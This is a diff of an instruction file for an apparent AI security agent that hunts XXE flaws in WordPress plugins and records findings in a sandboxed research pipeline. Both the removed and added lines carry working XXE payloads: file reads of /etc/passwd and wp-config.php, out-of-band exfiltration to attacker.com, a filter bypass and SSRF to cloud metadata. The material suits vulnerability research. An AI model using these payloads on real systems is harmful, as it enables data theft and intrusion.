@@ -197,20 +197,7 @@ public static function get_svg_dimensions( $svg ) {
 **Why vulnerable:** `simplexml_load_file()` without `LIBXML_NONET` flag allows external entity loading on PHP < 8.0. Even on PHP 8.0+, `LIBXML_NOENT` flag re-enables entity substitution. SVG files are XML and commonly processed by image-handling plugins.
 **Detection:** `simplexml_load_file()`, `simplexml_load_string()`, or `new SimpleXMLElement()` without `LIBXML_NONET` flag, especially in SVG dimension extraction or XML import functions.
 
-### CVE-2025-32138: Easy Google Maps — LIBXML_NOENT Trap
-**Impact:** Author+ XXE, CVSS 8.5
-
-```php
-// Developer used LIBXML_NOENT thinking it disables entities — it does the OPPOSITE
-$dom = new DOMDocument();
-$dom->loadXML($svg_content, LIBXML_NOENT | LIBXML_DTDLOAD);
-// LIBXML_NOENT = "substitute entities" (expand them), NOT "no entities"
-// LIBXML_DTDLOAD = load external DTD definitions
-// This ENABLES XXE even on PHP 8.0+ where it's otherwise disabled by default
-```
-
-**Why vulnerable:** `LIBXML_NOENT` is the most misleading flag name in PHP. It means "substitute entity references with their values" — the exact opposite of what developers expect. Combined with `LIBXML_DTDLOAD`, it creates a fully exploitable XXE on any PHP version.
-**Detection:** Search for `LIBXML_NOENT` in any XML parsing context — it's almost always a vulnerability. Also flag `LIBXML_DTDLOAD` with `DOMDocument::loadXML()`.
+- **CVE-2025-32138:** Easy Google Maps — `LIBXML_NOENT | LIBXML_DTDLOAD` in `DOMDocument::loadXML()`. LIBXML_NOENT *enables* entity substitution (opposite of what devs expect). Author+ XXE, CVSS 8.5.
 
 ### Critical libxml Flag Reference
 
@@ -224,91 +211,36 @@ $dom->loadXML($svg_content, LIBXML_NOENT | LIBXML_DTDLOAD);
 
 ## Attack Techniques
 
-### 1. Basic XXE - File Read
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>&xxe;</root>
-```
-
-### 2. XXE - PHP Wrapper
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-]>
-<root>&xxe;</root>
-```
-
-### 3. Blind XXE - Out-of-Band (OOB)
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
-  %xxe;
-]>
-<root>test</root>
-
-<!-- xxe.dtd on attacker server -->
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
-%eval;
-%exfil;
-```
-
-### 4. SVG XXE Payload
+### WordPress-Specific: SVG Upload XXE
 ```xml
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<svg xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text>&xxe;</text>
 </svg>
 ```
+Upload via `wp.handleUpload`, media library, or plugin import accepting SVG/XML files.
 
-### 5. XXE via XInclude
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
-```
-
-### 6. Error-Based XXE (Data Exfiltration)
+### WordPress-Specific: RSS/Atom Feed XXE
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
-  <!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
-  %dtd;
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
 ]>
-<root>&error;</root>
-
-<!-- error.dtd -->
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
+<rss version="2.0"><channel><title>&xxe;</title></channel></rss>
 ```
+Target plugin feed import/aggregation endpoints that call `simplexml_load_string()` or `fetch_feed()`.
 
-### 7. UTF-7 Encoded XXE (Bypass WAF)
-```xml
-<?xml version="1.0" encoding="UTF-7"?>
-+ADw-!DOCTYPE foo +AFs-
-  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
-+AF0-+AD4-
-+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
-```
-
-### 8. SSRF via XXE
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://internal-server/admin">
-]>
-<root>&xxe;</root>
-```
+### Other Techniques (adapt payload to context)
+- **Basic file read:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` in any parsed XML
+- **PHP filter wrapper:** `php://filter/convert.base64-encode/resource=` for binary-safe exfil
+- **Blind OOB:** Parameter entities + external DTD for no-output scenarios
+- **XInclude:** `<xi:include parse="text" href="file:///..."/>` when DOCTYPE is blocked
+- **Error-based:** Trigger parse errors containing file contents
+- **UTF-7/UTF-16 encoding:** Bypass naive content filters
+- **SSRF:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/...">` for cloud metadata
 
 ---
 
@@ -400,22 +332,6 @@ blind_xxe = '''<?xml version="1.0"?>
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -423,35 +339,15 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="xxe",
     title="XML External Entity Injection in Settings Import",
-    description="""
-## Vulnerability Summary
-XXE vulnerability in XML import allows reading arbitrary server files.
-
+    description="""## Vulnerability Summary
+XXE via simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT) in import handler.
 ## Data Flow
-Entry: Admin settings import (admin+)
-  ↓
-Input: Uploaded XML file
-  ↓
-Processing: simplexml_load_string($xml_content, 'SimpleXMLElement', LIBXML_NOENT)
-  ↓
-Vulnerable: LIBXML_NOENT flag enables entity substitution
-  ↓
-Impact: Can read /etc/passwd, wp-config.php, any readable file
-
+Entry: Settings import (admin+) → XML file upload → LIBXML_NOENT enables entity substitution → file read
 ## Prerequisites
-None — works with default plugin settings.
-
-## Exploitation
-1. Craft malicious XML with external entity
-2. Upload via settings import
-3. Entity resolved, file contents included in response
-
+- **Base plugins:** [None]  **Plugin settings:** [Default]  **Required content:** [None]
+- **Required roles/users:** [Default WordPress roles]  **WordPress config:** [Standard single-site]
 ## Impact
-- Read arbitrary files on server
-- Potential SSRF to internal services
-- Credential theft (wp-config.php)
-- Possible RCE via expect:// wrapper (if installed)
-    """,
+Read arbitrary files (wp-config.php, /etc/passwd). SSRF to internal services. RCE via expect:// if installed.""",
     auth_level="administrator",
     cvss_score=7.5,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
@@ -477,69 +373,4 @@ XXE via SVG upload: Same as regular XXE
 
 ---
 
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., external entity resolved, file contents returned, out-of-band callback received)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=external entity resolved, file contents returned, out-of-band callback received}}
